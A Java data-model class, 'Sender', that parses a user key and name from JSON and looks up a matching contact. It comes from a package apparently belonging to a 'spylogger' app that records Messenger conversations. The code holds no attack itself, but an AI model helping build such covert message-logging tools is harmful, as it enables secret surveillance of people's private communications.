package com.gravatasufoca.spylogger.model.messenger;

import java.io.Serializable;
import java.sql.SQLException;

import org.json.JSONException;
import org.json.JSONObject;

import com.gravatasufoca.spylogger.utils.Utils;

public class Sender extends EntidadeAbstrata {

	private static final long serialVersionUID = -974327506506662318L;
	private String userKey;
	private String nome;
	private Contact contato;

	public Sender(String json) {
		JSONObject tmp;
		try {
			tmp = new JSONObject(json);
			this.userKey=tmp.getString("user_key");
			this.nome=tmp.getString("name");
		} catch (JSONException e) {
			e.printStackTrace();
		}
	}

	public Sender(JSONObject json) throws JSONException {
		this.userKey=json.getString("user_key");
		this.nome=json.getString("name");
	}

	public String getUserKey() {
		return userKey;
	}
	public void setUserKey(String userKey) {
		this.userKey = userKey;
	}
	public String getNome() {
		return nome;
	}
	public void setNome(String nome) {
		this.nome = nome;
	}

	public Contact getContato() {
		if(contato==null){
			try {
				contato=Utils.getContato(userKey);

			} catch (SQLException e) {
				e.printStackTrace();
			}
		}

		return contato;
	}

	@Override
	public Serializable getId() {
		return userKey;
	}

}
